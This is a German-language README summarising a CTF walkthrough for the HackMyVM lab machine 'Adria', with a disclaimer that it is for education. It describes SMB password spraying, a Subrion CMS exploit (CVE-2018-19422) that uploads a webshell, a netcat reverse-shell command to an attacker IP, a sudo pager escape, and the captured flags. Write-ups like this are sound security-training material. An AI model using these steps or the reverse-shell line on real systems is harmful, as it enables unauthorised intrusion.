# Adria - HackMyVM Lösungsweg

![Adria VM Icon](adria.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Adria".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Adria
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Mittel (Medium)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=adria](https://hackmyvm.eu/machines/machine.php?vm=adria)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/Adria.HackMyVM/](https://alientec1908.github.io/Adria.HackMyVM/)
*   **Datum des Originalberichts:** 26. April 2024

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `vi`
*   `nmap`
*   `enum4linux`
*   `smbclient`
*   `crackmapexec`
*   `grep`
*   `python3` (insb. `http.server`)
*   `nc` (netcat)
*   `stty`
*   `find`
*   `getcap`
*   `wget`
*   `sudo`
*   `scalar` (GIT)
*   `ssh2john`
*   `ssh`
*   `fcrackzip`
*   Standard Linux-Befehle (`ls`, `cat`, `chmod`, `cd`, `su`, etc.)

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.110` wurde mittels `arp-scan -l` identifiziert.
*   Der Hostname `adria.hmv` wurde der IP `192.168.2.110` in der `/etc/hosts`-Datei des Angreifers zugeordnet.
*   Ein `nmap`-Scan (`nmap -sS -sV -AO -T5 192.168.2.110 -p-`) ergab offene Ports:
    *   **Port 22/tcp (SSH):** OpenSSH 9.2p1 Debian 2.
    *   **Port 80/tcp (HTTP):** Apache httpd 2.4.57 ((Debian)), hostet ein **Subrion CMS 4.2**.
        *   `robots.txt` enthüllte Pfade wie `/backup/`, `/panel/`, `/install/`.
    *   **Port 139/tcp (NetBIOS-SSN):** Samba smbd 4.6.2.
    *   **Port 445/tcp (SMB):** Samba smbd 4.6.2.

### 2. Web Enumeration & SMB

*   **SMB Enumeration:**
    *   `enum4linux -a 192.168.2.110` fand die Freigaben `print$`, `DebianShare`, `IPC$`, `nobody` und den Unix-Benutzer **`adriana`** (UID 1001).
    *   `smbclient -L \\\\192.168.2.110` bestätigte die Freigaben.
    *   `crackmapexec smb 192.168.2.110 -u adriana -p /usr/share/wordlists/rockyou.txt` fand das Passwort **`s13!34g$3FVA5e@ed`** für den Benutzer `adriana`.
    *   `crackmapexec smb 192.168.2.110 -u guest -p '' --shares` zeigte, dass der Gastbenutzer Lesezugriff auf `DebianShare` hat.
    *   In `DebianShare` wurde via `crackmapexec --spider` die Datei `configz.zip` gefunden.
*   **Analyse von `configz.zip`:**
    *   Die Datei wurde mit `smbclient` heruntergeladen.
    *   Die Verzeichnisstruktur (`boot`, `isolinux`, `preseed`) deutete auf ein Installationsarchiv (vermutlich Debian Preseed) hin.
    *   `grep -ri pass *` im entpackten Archiv fand in `preseed/master.preseed` die Klartext-Zugangsdaten:
        *   Benutzer: `admin`, Passwort: `jojo1989`
        *   Benutzer: `root`, Passwort: `jojo1989`
*   **Web Enumeration (Subrion CMS):**
    *   Der Quellcode der Webseite auf `http://adria.hmv/` zeigte einen `securityToken`.
    *   Eine Registrierungsfunktion schien Passwörter per E-Mail zu versenden.
    *   Es wurde versucht, sich mit `admin:jojo1989` im Admin-Panel (`/panel/`) des Subrion CMS anzumelden.

### 3. Initial Access als `www-data`

*   **Ausnutzung von CVE-2018-19422 (Subrion CMS RCE):**
    *   Ein Exploit-Skript (`subrion.py`) für diese Schwachstelle wurde von GitHub heruntergeladen.
    *   Das Skript wurde ausgeführt: `python3 subrion.py -u http://adria.hmv/panel/ -l admin -p jojo1989`.
    *   Das Skript lud erfolgreich eine Webshell (`.phar`-Datei) hoch und ermöglichte die Ausführung von Befehlen.
    *   Über die Webshell wurde `id` ausgeführt (Ergebnis: `www-data`) und `netcat` (`nc`) lokalisiert.
*   **Reverse Shell als `www-data` etabliert:**
    *   Ein Netcat-Listener wurde auf der Angreifer-Maschine gestartet (`nc -lvnp 4444`).
    *   Über die Webshell wurde eine Reverse Shell zum Listener aufgebaut:
        `nc -e /bin/bash ANGREIFER_IP 4444`
    *   Die Shell wurde mit Python PTY und `stty` stabilisiert.

### 4. Privilege Escalation

*   **Enumeration als `www-data`:**
    *   Ein lokaler MySQL-Dienst auf Port `3306` wurde identifiziert.
    *   Der Benutzer `adriana` wurde als Zsh-Benutzer bestätigt. Der Zugriff auf `/home/adriana/` wurde verweigert.
    *   In `/opt/` wurde ein Shell-Skript namens `backup` gefunden, das ein Passwort aus `/root/pass` liest und dieses zum Verschlüsseln von `/opt/backup.zip` verwendet.
    *   Keine ungewöhnlichen SUID-Binaries oder Capabilities, die direkt ausnutzbar schienen.
    *   `pspy64` wurde auf das Zielsystem geladen, zeigte jedoch keine offensichtlich ausnutzbaren Cronjobs für `www-data`.
*   **Horizontale Privilegieneskalation zu `adriana`:**
    *   `sudo -l` als `www-data` zeigte: `(adriana) NOPASSWD: /usr/bin/scalar`.
    *   Durch Ausführen von `sudo -u adriana /usr/bin/scalar help` und anschließender Eingabe von `!bash` im Pager von `scalar` konnte eine Shell als Benutzer `adriana` erlangt werden.
*   **Enumeration als `adriana`:**
    *   Im Home-Verzeichnis von `adriana` wurde die `user.txt` gefunden und gelesen.
    *   Die `.bash_history` enthielt den Befehl `su - 8eNctPoCh4Potes5eVD7eMxUw6wRBmO`. Dieser String wurde als potenzielles Root-Passwort identifiziert.
    *   Der private SSH-Schlüssel `id_rsa` von `adriana` wurde gefunden. `ssh2john` zeigte, dass der Schlüssel **nicht passwortgeschützt** ist.
*   **Bestätigung des Root-Passworts:**
    *   Der Angreifer führte `/opt/backup` als `adriana` aus (oder ließ es durch das System ausführen) und gab das Passwort `8eNctPoCh4Potes5eVD7eMxUw6wRBmO` ein. Das Skript erstellte `/opt/backup.zip`.
    *   Diese `backup.zip` wurde auf das Angreifer-System heruntergeladen.
    *   `fcrackzip -D -u -v -p /usr/share/wordlists/rockyou.txt backup.zip` knackte das Passwort der ZIP-Datei und bestätigte **`8eNctPoCh4Potes5eVD7eMxUw6wRBmO`**.
*   **Finale Privilegieneskalation zu `root`:**
    *   Als `adriana` wurde `su root` ausgeführt.
    *   Das Passwort `8eNctPoCh4Potes5eVD7eMxUw6wRBmO` wurde eingegeben.
    *   **Erfolgreicher Login als `root`**.
    *   Im Home-Verzeichnis von `root` wurden die Dateien `pass` (enthielt das Root-Passwort) und `root.txt` gefunden.

### 5. Flags

*   **User-Flag (`/home/adriana/user.txt`):**
    ```
    fbd401c3bff5ec92d1ba6f74a2340f0f
    ```
*   **Root-Flag (`/root/root.txt`):**
    ```
    3a61b172fd39402aa96b1653a18e38a1
    ```

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Adria" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
